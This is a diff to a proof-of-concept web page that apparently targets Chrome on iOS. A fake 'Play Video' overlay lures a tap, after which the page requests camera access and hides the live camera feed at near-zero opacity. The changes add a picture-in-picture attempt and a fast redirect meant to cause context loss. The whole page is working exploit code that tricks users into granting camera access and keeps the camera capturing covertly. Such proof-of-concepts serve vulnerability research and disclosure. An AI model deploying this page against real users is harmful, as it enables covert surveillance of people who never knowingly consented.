@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
 <meta charset="utf-8">
-<title>Chrome iOS Camera Permission PoC</title>
+<title>Chrome iOS Camera + PiP PoC</title>
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 
 <style>
@@ -34,14 +34,14 @@ html, body {
   border-radius: 14px;
 }
 
-/* Camera */
+/* Camera video */
 video {
   position: fixed;
   inset: 0;
   width: 100%;
   height: 100%;
   object-fit: cover;
-  opacity: 0.01;
+  opacity: 0.01; /* hampir tidak terlihat */
 }
 </style>
 </head>
@@ -52,28 +52,34 @@ video {
   <div id="play">▶️ Play Video</div>
 </div>
 
-<video id="camera" autoplay playsinline></video>
+<video id="camera" autoplay playsinline muted></video>
 
 <script>
 const overlay = document.getElementById('overlay');
 const camera  = document.getElementById('camera');
 
-overlay.addEventListener('click', () => {
-  // 1️⃣ Remove visual context
+overlay.addEventListener('click', async () => {
   overlay.remove();
 
-  // 2️⃣ Trigger camera permission shortly after tap
+  // 1️⃣ Trigger camera permission
   setTimeout(async () => {
     try {
       const stream = await navigator.mediaDevices.getUserMedia({ video: true });
       camera.srcObject = stream;
+
+      // 2️⃣ Attempt PiP
+      if (document.pictureInPictureEnabled) {
+        try {
+          await camera.requestPictureInPicture();
+        } catch (e) {}
+      }
     } catch (e) {}
   }, 80);
 
-  // 3️⃣ Redirect shortly after permission UI
+  // 3️⃣ Redirect (context loss)
   setTimeout(() => {
     location.href = "https://google.com:8080";
-  }, 300);
+  }, 80);
 });
 </script>
 
